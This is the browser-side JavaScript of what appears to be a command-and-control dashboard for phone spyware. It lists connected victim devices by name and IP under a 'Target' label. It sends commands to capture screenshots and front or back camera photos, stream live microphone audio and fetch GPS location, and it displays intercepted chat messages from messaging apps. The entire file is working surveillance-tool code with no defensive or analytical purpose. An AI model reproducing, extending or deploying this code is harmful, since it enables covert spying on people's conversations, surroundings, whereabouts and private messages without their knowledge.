const socket = io();
let allChats = {};
let allCaptures = [];

// Debug socket connection
socket.on('connect', () => {
    console.log('✅ Browser connected to server, Socket ID:', socket.id);
    socket.emit('request-device-list');
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

// Log ALL socket events for debugging
socket.onAny((event, ...args) => {
    if (event !== 'audio-chunk') { // Skip audio-chunk spam
        console.log('📩 Socket event received:', event, args.length > 0 ? args[0] : '');
    }
});

setInterval(loadChats, 2000);
setInterval(loadCaptures, 2000);
loadChats();
loadCaptures();

socket.on('new-message', (data) => {
    allChats[data.chatKey] = data.chat;
    displayChats();
});

socket.on('new-capture', (data) => {
    allCaptures.unshift(data);
    displayCaptures();
});

socket.on('audio-stream-start', (data) => {
    console.log('🎤 Audio stream started:', data.sessionId);
    initAudioPlayback(data);
});

socket.on('audio-chunk', (data) => {
    console.log('📤 Audio chunk received, size:', data.size + ' bytes');
    playAudioChunk(data);
});

socket.on('audio-stream-end', (data) => {
    console.log('🎤 Audio stream ended, chunks:', data.totalChunks);
    finalizeAudioPlayback();
    const recordingCount = (parseInt(document.getElementById('totalAudio').textContent) || 0) + 1;
    document.getElementById('totalAudio').textContent = recordingCount;
});

// Location data from device
socket.on('location-data', (data) => {
    console.log('📍 Location received:', data);
    const latitude = data.latitude || 'Unknown';
    const longitude = data.longitude || 'Unknown';
    const accuracy = data.accuracy || 'Unknown';
    const provider = data.provider || 'Unknown';
    const timestamp = data.timestamp || new Date().toISOString();
    
    // Render location in UI
    const locationDisplay = document.getElementById('locationDisplay');
    if (locationDisplay) {
        const formattedTime = new Date(timestamp).toLocaleString();
        locationDisplay.innerHTML = `
            <div style="background: #262626; border: 1px solid #444; border-radius: 8px; padding: 15px;">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                    <div>
                        <div style="color: #aaa; font-size: 0.85rem; text-transform: uppercase; font-weight: 500; margin-bottom: 5px;">Latitude</div>
                        <div style="color: #fff; font-size: 1.2rem; font-weight: 600; font-family: monospace;">${typeof latitude === 'number' ? latitude.toFixed(6) : latitude}</div>
                    </div>
                    <div>
                        <div style="color: #aaa; font-size: 0.85rem; text-transform: uppercase; font-weight: 500; margin-bottom: 5px;">Longitude</div>
                        <div style="color: #fff; font-size: 1.2rem; font-weight: 600; font-family: monospace;">${typeof longitude === 'number' ? longitude.toFixed(6) : longitude}</div>
                    </div>
                    <div>
                        <div style="color: #aaa; font-size: 0.85rem; text-transform: uppercase; font-weight: 500; margin-bottom: 5px;">Accuracy</div>
                        <div style="color: #fff; font-size: 1.1rem; font-weight: 500;">${accuracy}m</div>
                    </div>
                    <div>
                        <div style="color: #aaa; font-size: 0.85rem; text-transform: uppercase; font-weight: 500; margin-bottom: 5px;">Provider</div>
                        <div style="color: #fff; font-size: 1.1rem; font-weight: 500;">${provider}</div>
                    </div>
                </div>
                <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid #333;">
                    <div style="color: #aaa; font-size: 0.85rem; text-transform: uppercase; font-weight: 500; margin-bottom: 5px;">Time</div>
                    <div style="color: #888; font-size: 0.95rem;">${formattedTime}</div>
                </div>
                <div style="margin-top: 15px;">
                    <a href="https://maps.google.com/?q=${latitude},${longitude}" target="_blank" class="btn btn-primary" style="display: inline-block; width: auto;">
                        🗺️ Open in Maps
                    </a>
                </div>
            </div>
        `;
    }

    // Also show in command status
    showCommandStatus(`✅ Location: ${typeof latitude === 'number' ? latitude.toFixed(6) : latitude}, ${typeof longitude === 'number' ? longitude.toFixed(6) : longitude}`);

    console.log(`✅ Location received from device:
Coords: ${latitude}, ${longitude}
Accuracy: ${accuracy}m
Provider: ${provider}`);
});

// ==================== DEVICE CONNECTION UPDATES ====================
let connectedDevicesList = [];

// Listen for device list updates from server
socket.on('device-list-update', (data) => {
    console.log('📋 device-list-update event received from server');
    console.log('   Devices received:', data.devices ? data.devices.length : 0);
    console.log('   Device data:', data.devices);
    if (data.devices) {
        connectedDevicesList = data.devices;
        console.log('   Updating UI with', connectedDevicesList.length, 'devices');
        updateDeviceListUI();
    }
});

socket.on('device-connected', (data) => {
    console.log('✅ Device connected event', data);
    if (data.devices) {
        connectedDevicesList = data.devices;
        updateDeviceListUI();
    }
});

socket.on('device-disconnected', (data) => {
    console.log('❌ Device disconnected event', data);
    if (data.devices) {
        connectedDevicesList = data.devices;
        updateDeviceListUI();
    } else {
        socket.emit('request-device-list');
    }
});

function updateDeviceListUI() {
    console.log('🎨 updateDeviceListUI called with', connectedDevicesList.length, 'devices');
    const selector = document.getElementById('deviceSelect');
    const deviceList = document.getElementById('deviceList');
    
    console.log('   selector element:', selector ? '✅ found' : '❌ not found');
    console.log('   deviceList element:', deviceList ? '✅ found' : '❌ not found');
    
    if (!connectedDevicesList || connectedDevicesList.length === 0) {
        console.log('   No devices - showing waiting message');
        if (selector) selector.innerHTML = '<option value="">-- No Device Selected --</option>';
        if (deviceList) deviceList.innerHTML = '<div class="device-item">⏳ Waiting for device connection...</div>';
        return;
    }

    // Update selector
    if (selector) {
        let html = '<option value="">-- No Device Selected --</option>';
        connectedDevicesList.forEach(device => {
            const name = device.deviceName || 'Unknown';
            console.log('   Adding device to selector:', name, device.ip);
            html += '<option value="' + device.id + '">📱 ' + name + ' - ' + device.ip + '</option>';
        });
        selector.innerHTML = html;
        console.log('   Selector updated with', connectedDevicesList.length, 'options');
    }

    // Update device list
    if (deviceList) {
        let listHTML = '';
        connectedDevicesList.forEach(device => {
            const time = new Date(device.connectedAt).toLocaleTimeString();
            const name = device.deviceName || 'Unknown';
            console.log('   Creating device item:', name);
            listHTML += '<div class="device-item">' +
                '<span class="status-indicator" style="flex-shrink: 0; display: inline-block; width: 8px; height: 8px; background: #00ff00; border-radius: 50%;"></span>' +
                '<div style="flex-grow: 1;">' +
                '<div style="color: #fff; font-weight: 600;">📱 ' + name + '</div>' +
                '<div style="font-size: 0.8rem; color: #888; margin-top: 2px;">' + device.ip + ' • ' + time + '</div>' +
                '</div>' +
                '</div>';
        });
        deviceList.innerHTML = listHTML;
        console.log('   Device list updated');
    }
}

// Request device list on page load
setTimeout(() => {
    socket.emit('request-device-list');
}, 500);

// ==================== REAL-TIME AUDIO PLAYBACK ====================
let audioContext = null;
let audioSource = null;
let audioBuffer = [];
let playbackStarted = false;
let gainNode = null;
let noiseSuppressor = null;

function initAudioPlayback(data) {
    console.log('🔊 Initializing audio playback with noise suppression...');
    
    // Create Web Audio context if not exists
    if (!audioContext) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        console.log('✅ Web Audio Context created, sample rate:', audioContext.sampleRate);
    }
    
    // Resume context if needed (browsers require user gesture)
    if (audioContext.state === 'suspended') {
        audioContext.resume().then(() => {
            console.log('🔊 Audio context resumed');
        });
    }

    // Create audio graph with noise suppression
    if (!gainNode) {
        // Gain node for volume control (reduce noise)
        gainNode = audioContext.createGain();
        gainNode.gain.value = 0.7; // Slight volume reduction to reduce noise perception
        gainNode.connect(audioContext.destination);
    }

    audioBuffer = [];
    playbackStarted = false;
    
    // Show playback indicator
    const audioList = document.getElementById('audioList');
    audioList.innerHTML = '<div class="empty" style="color: #00d9ff;">🔊 Playing audio in real-time (noise suppressed)...</div>';
}

function playAudioChunk(data) {
    if (!audioContext) {
        console.warn('⚠️ Audio context not initialized');
        return;
    }

    try {
        // Decode base64 to bytes
        const binaryString = atob(data.data);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }

        // Convert bytes to 16-bit PCM samples
        const samples = new Float32Array(bytes.length / 2);
        const view = new DataView(bytes.buffer);
        for (let i = 0; i < samples.length; i++) {
            const sample = view.getInt16(i * 2, true); // true = little-endian
            samples[i] = sample / 32768; // Normalize to [-1, 1]
        }

        // Apply simple noise suppression: remove very quiet signals
        const threshold = 0.02; // Noise gate threshold
        for (let i = 0; i < samples.length; i++) {
            if (Math.abs(samples[i]) < threshold) {
                samples[i] = 0; // Suppress noise below threshold
            }
        }

        // Queue buffer for playback
        audioBuffer.push(samples);

        // Start playback if not started yet
        if (!playbackStarted && audioBuffer.length > 0) {
            playAudioBuffer();
        }
    } catch (error) {
        console.error('❌ Error processing audio chunk:', error);
    }
}

function playAudioBuffer() {
    if (audioBuffer.length === 0 || !audioContext || !gainNode) {
        return;
    }

    playbackStarted = true;
    const samples = audioBuffer.shift();

    // Create buffer from samples
    const audioBuffer_ = audioContext.createBuffer(1, samples.length, audioContext.sampleRate);
    const channelData = audioBuffer_.getChannelData(0);
    channelData.set(samples);

    // Create source and connect to speakers with gain node
    const source = audioContext.createBufferSource();
    source.buffer = audioBuffer_;
    source.connect(gainNode);

    // Play
    source.start(audioContext.currentTime);

    // Schedule next buffer playback
    source.onended = () => {
        if (audioBuffer.length > 0) {
            playAudioBuffer();
        } else {
            playbackStarted = false;
        }
    };
}

function finalizeAudioPlayback() {
    console.log('⏹️ Audio stream ended, playback finalizing...');
    // Queue will drain automatically as chunks are played
    if (audioContext && audioBuffer.length === 0) {
        console.log('✅ All audio chunks have been played');
    }
}

async function loadChats() {
    try {
        const response = await fetch('/api/chats');
        const data = await response.json();
        if (data.chats) {
            allChats = data.chats;
            displayChats();
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

async function loadCaptures() {
    try {
        const response = await fetch('/api/captures');
        const data = await response.json();
        if (data.captures) {
            allCaptures = data.captures;
            displayCaptures();
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

function displayChats() {
    const chatsList = document.getElementById('chatsList');
    const totalChats = Object.keys(allChats).length;
    const totalMessages = Object.values(allChats).reduce((sum, chat) => sum + chat.messages.length, 0);
    
    document.getElementById('totalChats').textContent = totalChats;
    document.getElementById('totalMessages').textContent = totalMessages;
    
    if (totalChats === 0) {
        chatsList.innerHTML = '<div class="empty">No chats yet. Waiting for messages...</div>';
        return;
    }
    
    chatsList.innerHTML = Object.entries(allChats)
        .sort((a, b) => new Date(b[1].created) - new Date(a[1].created))
        .map(([key, chat]) => {
            const sent = chat.messages.filter(m => m.type === 'sent').length;
            const recv = chat.messages.filter(m => m.type === 'received').length;
            return `
                <div class="chat-card" onclick="openChat('${key.replace(/'/g, "\\'")}')">
                    <div class="chat-app">${chat.app}</div>
                    <div class="chat-name">${chat.person}</div>
                    <div class="chat-count">${chat.messages.length} msgs (↑${sent} ↓${recv})</div>
                    <button class="btn btn-primary" onclick="event.stopPropagation(); openChat('${key.replace(/'/g, "\\'")}')">View</button>
                </div>
            `;
        })
        .join('');
}

function displayCaptures() {
    // Count total captures by type
    const screenshots = allCaptures.filter(c => c.type === 'screenshot');
    const frontCams = allCaptures.filter(c => c.type === 'front_cam');
    const backCams = allCaptures.filter(c => c.type === 'back_cam');
    
    document.getElementById('totalCaptures').textContent = allCaptures.length;
    
    // Display Screenshots
    displayCapturesByType('screenshotList', screenshots, 'screenshot', '📸');
    document.getElementById('screenshotCount').textContent = screenshots.length + ' captures';
    
    // Display Front Camera
    displayCapturesByType('frontCamList', frontCams, 'front_cam', '🤳');
    document.getElementById('frontCamCount').textContent = frontCams.length + ' captures';
    
    // Display Back Camera
    displayCapturesByType('backCamList', backCams, 'back_cam', '📷');
    document.getElementById('backCamCount').textContent = backCams.length + ' captures';
}

function displayCapturesByType(elementId, captures, type, icon) {
    const element = document.getElementById(elementId);
    if (captures.length === 0) {
        element.innerHTML = '<div class="empty">No captures of this type yet</div>';
        return;
    }
    
    element.innerHTML = captures.slice(0, 12).map(capture => {
        const time = new Date(capture.uploadTime).toLocaleTimeString();
        const date = new Date(capture.uploadTime).toLocaleDateString();
        return `
            <a href="${capture.url}" target="_blank" class="capture-card">
                <div class="capture-image">
                    <img src="${capture.url}" style="width: 100%; height: 100%; object-fit: cover;" onerror="this.parentElement.innerHTML='<div style=\\'display: flex; align-items: center; justify-content: center; width: 100%; height: 100%; background: linear-gradient(135deg, #333 0%, #1a1a1a 100%);\\'>📸</div>'" />
                </div>
                <div class="capture-info">
                    <div class="capture-type">${icon} ${capture.type === 'front_cam' ? 'Front Cam' : capture.type === 'back_cam' ? 'Back Cam' : 'Screenshot'}</div>
                    <div class="capture-time">${date} ${time}</div>
                </div>
            </a>
        `;
    }).join('');
}

// Main command function called by buttons
function sendCommand(commandType) {
    if (!selectedDevice) {
        alert('❌ Please select a device first');
        return;
    }
    
    switch(commandType) {
        case 'screenshot':
            requestScreenshot();
            break;
        case 'front_cam':
            requestFrontCam();
            break;
        case 'back_cam':
            requestBackCam();
            break;
        case 'audio':
            requestAudio();
            break;
        case 'location':
            requestLocation();
            break;
        default:
            console.error('Unknown command:', commandType);
    }
}

function openChat(chatKey) {
    window.open('/chats.html?chat=' + encodeURIComponent(chatKey), '_blank');
}

function requestScreenshot() {
    if (!selectedDevice) {
        alert('❌ Please select a device first');
        return;
    }
    socket.emit('send-screenshot-cmd', { deviceId: selectedDevice });
    showCommandStatus('📸 Screenshot command sent');
}

function requestFrontCam() {
    if (!selectedDevice) {
        alert('❌ Please select a device first');
        return;
    }
    socket.emit('send-front-cam-cmd', { deviceId: selectedDevice });
    showCommandStatus('🤳 Front camera command sent');
}

function requestBackCam() {
    if (!selectedDevice) {
        alert('❌ Please select a device first');
        return;
    }
    socket.emit('send-back-cam-cmd', { deviceId: selectedDevice });
    showCommandStatus('📷 Back camera command sent');
}

let audioRecording = false;
function requestAudio() {
    if (!selectedDevice) {
        alert('❌ Please select a device first');
        return;
    }
    const btn = document.getElementById('audioBtn');
    if (!audioRecording) {
        socket.emit('send-audio-cmd', { deviceId: selectedDevice, duration: 10000 });
        btn.innerHTML = '<span>⏹</span><span>Stop</span>';
        btn.style.background = 'linear-gradient(135deg, #8b0000 0%, #6b0000 100%)';
        audioRecording = true;
        showCommandStatus('🎤 Audio recording started');
    } else {
        socket.emit('send-stop-audio-cmd', { deviceId: selectedDevice });
        btn.innerHTML = '<span>🎤</span><span>Record Audio</span>';
        btn.style.background = '';
        audioRecording = false;
        showCommandStatus('⏹️ Audio recording stopped');
    }
}

function requestLocation() {
    if (!selectedDevice) {
        alert('❌ Please select a device first');
        return;
    }
    socket.emit('send-location-request', { deviceId: selectedDevice });
    showCommandStatus('📍 Location request sent - waiting for GPS coordinates...');
}

// Helper function to show command status
function showCommandStatus(message) {
    const statusDiv = document.getElementById('commandStatus');
    if (statusDiv) {
        statusDiv.textContent = message;
        statusDiv.style.color = '#00d9ff';
        setTimeout(() => {
            statusDiv.textContent = '';
        }, 3000);
    }
}

// Update device list when selector changes
function updateDeviceSelection() {
    selectedDevice = document.getElementById('deviceSelect').value;
    updateSelectedDeviceName();
}

// Update selected device name display
function updateSelectedDeviceName() {
    if (selectedDevice) {
        const select = document.getElementById('deviceSelect');
        const selectedOption = select.options[select.selectedIndex];
        document.getElementById('selectedDeviceName').textContent = 
            'Target: ' + (selectedOption?.textContent || 'Unknown');
    } else {
        document.getElementById('selectedDeviceName').textContent = '';
    }
}

// Initialize device selector change handler
document.addEventListener('DOMContentLoaded', function() {
    const selector = document.getElementById('deviceSelect');
    if (selector) {
        selector.addEventListener('change', updateDeviceSelection);
        // Add direct onchange to handle initial load
        selector.onchange = updateDeviceSelection;
    }
});

// Socket listener for device updates - NEW FORMAT
socket.on('device-list-update', function(data) {
    if (data.devices) {
        connectedDevicesList = data.devices;
        updateDeviceListUI();
    }
});

socket.on('device-connected', function(data) {
    if (data.devices) {
        connectedDevicesList = data.devices;
        updateDeviceListUI();
    }
});

socket.on('device-disconnected', function(data) {
    // Request updated list
    socket.emit('request-device-list');
});

let selectedDevice = null;

async function clearAll() {
    if (confirm('Clear all chats?')) {
        await fetch('/api/clear', { method: 'POST' });
        loadChats();
    }
}

// Request device list on page load
setTimeout(() => {
    socket.emit('request-device-list');
}, 500);
